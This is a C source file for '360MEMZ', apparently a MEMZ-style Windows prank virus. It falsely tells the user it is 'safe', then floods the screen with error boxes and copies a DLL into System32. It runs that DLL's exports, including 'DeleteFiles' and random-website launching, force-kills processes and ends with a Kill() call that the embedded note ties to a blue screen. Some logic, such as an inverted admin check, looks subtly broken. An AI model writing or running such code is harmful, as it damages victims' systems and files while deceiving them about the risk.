#include "360MEMZ.h"

const wchar_t *tips = L"你的电脑被\"360MEMZ的复仇\"汐了!!!\n\
但是这是一个“安全”的特效程序组。\n\
你可以随时关闭它，除蓝屏强制关机外不会对电脑造成任何损害。\n\n\
所以放心van♂吧！ \n\
程序组作者：b站@旮沓曼_gt428";

HCRYPTPROV prov;

extern int lasteffect;


int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}
void write(){
	FILE *fout = fopen("\\tips.txt", "w");
	fwprintf(fout, L"%s", tips);
	fclose(fout);
	ShellExecuteA(NULL, NULL, "notepad", "\\tips.txt", NULL, SW_SHOWDEFAULT);

}

MCIERROR openSound(LPWSTR path, LPWSTR alias, LPWSTR type) {
	LPWSTR inserts[] = { path, alias, type };

	LPWSTR cmd;
	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
		L"open \"%1\" type %3 alias \"%2\"", 0, 0, (LPWSTR)&cmd, 8192, (va_list *)inserts);

	MCIERROR err = mciSendStringW(cmd, NULL, 0, NULL);
	LocalFree(cmd);
	return err;
}

MCIERROR resetSound(LPWSTR alias) {
	MCI_SEEK_PARMS params;
	memset(&params, 0, sizeof(params));
	return mciSendCommand(mciGetDeviceID(alias), MCI_SEEK, MCI_SEEK_TO_START, (DWORD)&params);
}

MCIERROR playSound(LPWSTR alias, BOOL async) {
	MCIERROR err = resetSound(alias);
	if (err) return err;

	LPCWSTR inserts[] = { alias, async ? L"" : L" wait" };

	LPWSTR cmd;
	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
		L"play \"%1\"%2", 0, 0, (LPWSTR)&cmd, 8192, (va_list *)inserts);

	err = mciSendStringW(cmd, NULL, 0, NULL);
	LocalFree(cmd);
	return err;
}

MCIERROR playSound(LPWSTR alias, LPWSTR type, LPWSTR path, BOOL async) {
	MCIERROR err;

	if (playSound(alias, async)) {
		if ((err = openSound(path, alias, type))) {
			return err;
		} else {
			return playSound(alias, async);
		}
	}

	return 0;
}

MCIERROR stopSound(LPWSTR alias) {
	MCIERROR err = resetSound(alias);
	if (err) return err;

	LPWSTR inserts[] = { alias };

	LPWSTR cmd;
	FormatMessageW(FORMAT_MESSAGE_FROM_STRING | FORMAT_MESSAGE_ARGUMENT_ARRAY | FORMAT_MESSAGE_ALLOCATE_BUFFER,
		L"stop \"%1\"", 0, 0, (LPWSTR)&cmd, 8192, (va_list *)inserts);

	err = mciSendStringW(cmd, NULL, 0, NULL);
	LocalFree(cmd);
	return err;
}

MCIERROR playSound(LPWSTR alias, LPWSTR path, BOOL async) {
	return playSound(alias, L"mpegvideo", path, async);
}


int scrh, scrw; 

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI Box1(LPVOID para){
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBox(NULL, L"三连以进入病毒!", L"360MEMZ", MB_ICONERROR);
	UnhookWindowsHookEx(hook);
	return 0;
}

DWORD WINAPI VideoThread(LPVOID lpParameter){
	char message[100];
    mciSendStringA("Open \"360MEMZ.wmv\" type mpegvideo Alias MyVideo", message, 100, 0);
    printf("open: %s\n", message);
    mciSendStringA("Play MyVideo", message, 100, 0);
    Sleep(20000);
    mciSendStringA("Pause MyVideo", "", 0, 0);
}

int main(){
	if((!IsWin7OrLater())||(IsUserAnAdmin())){
		MessageBox(NULL, L"此程序需要Windows 7 及以上且拥有管理员权限才能运行！", L"360MEMZ", MB_ICONERROR);
	}
	scrh = GetSystemMetrics(SM_CXSCREEN), scrw = GetSystemMetrics(SM_CYSCREEN);
	setlocale(LC_ALL, "chs");
	write();
	Sleep(2000);
	LPSTR lpCurrentPath = (LPSTR)LocalAlloc(LMEM_ZEROINIT, MAX_PATH);
	GetModuleFileNameA(NULL, lpCurrentPath, MAX_PATH);
	playSound(L"button", L"1.data", TRUE);
	
	*(strrchr(lpCurrentPath, '\\')) = 0;
	
	Sleep(2500);
	
	SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"pic1.bmp", SPIF_UPDATEINIFILE);
	HWND hShell = FindWindowA("Shell_TrayWnd", NULL);
	SendMessage(hShell, WM_COMMAND, (WPARAM)419, 0);
	Sleep(5000); 
	DWORD tid[20]; 
	for(int i = 0; i< 20; i++){
		CreateThread(NULL, 4096, Box1, NULL, 0, tid+i); 
		Sleep(50);
	}
	Sleep(3000);
	
	
	//ShellExecuteA(NULL, NULL, "notepad", "\\tips.txt", NULL, SW_SHOWDEFAULT);
	CreateThread(NULL, 4096, CreateTerminater ,(LPVOID)GetCurrentThreadId(), 0, NULL);
	for(int i = 0; i< 20; i++){
		TerminateThread(OpenThread(THREAD_ALL_ACCESS, 0, tid[i]), 0);
		
		Sleep(50);
	}


const char *sysroot =strcat(getenv("SystemRoot"),"\\System32\\360MEMZ.dll") ;
	WCHAR TempVar[256];
	memset(TempVar,0,sizeof(TempVar));
	MultiByteToWideChar(CP_ACP,0,sysroot,strlen(sysroot)+1,TempVar,
		sizeof(TempVar)/sizeof(TempVar[0]));
CopyFile(L"360MEMZ.dll",TempVar, FALSE);
	Sleep(2000);
	
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,RecycleBin", NULL, SW_SHOWDEFAULT);
	Sleep(30000);
	lasteffect++;
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,RandomWebsites", NULL, SW_SHOWDEFAULT);
	Sleep(25000);
	SendMessage(hShell, WM_COMMAND, (WPARAM)419, 0);
	ShellExecuteA(NULL, NULL, "taskbar.exe", "test.txt", NULL, SW_HIDE);
	lasteffect++;
	Sleep(12000);
	lasteffect++;
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,DeleteFiles", NULL, SW_SHOWDEFAULT);
	Sleep(20000);
	lasteffect++;
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,Question", NULL, SW_SHOWDEFAULT);
	Sleep(5000);
	lasteffect++;
	CreateThread(NULL, 4096, VideoThread, NULL, 0, 0);
	Sleep(40000);
	
	system("taskkill /f /im rundll32.exe");
	playSound(L"360MEMZ", L"2.data", TRUE);
	Sleep(8000);
	
	
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,sineCurve", NULL, SW_SHOWDEFAULT);
	lasteffect++;
	Sleep(15000);
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,Circle", NULL, SW_SHOWDEFAULT);
	lasteffect++;
	Sleep(20000);
	system("taskkill /f /im rundll32.exe");
	ShellExecuteA(NULL, NULL, "NyanConsole.exe", "", NULL, SW_SHOWDEFAULT);
	
	lasteffect++;
	Sleep(20000);
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,Blackhole", NULL, SW_SHOWDEFAULT);
	Sleep(10000);
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,Blackhole", NULL, SW_SHOWDEFAULT);
	Sleep(5000);
	system("taskkill /f /im rundll32.exe");
	lasteffect++;
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,winver", NULL, SW_SHOWDEFAULT);
	Sleep(15000);
	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,Blackhole", NULL, SW_SHOWDEFAULT);
	Sleep(20000);
	Kill();
	TerminateThread(GetCurrentThread(), 0); 
	
}
 
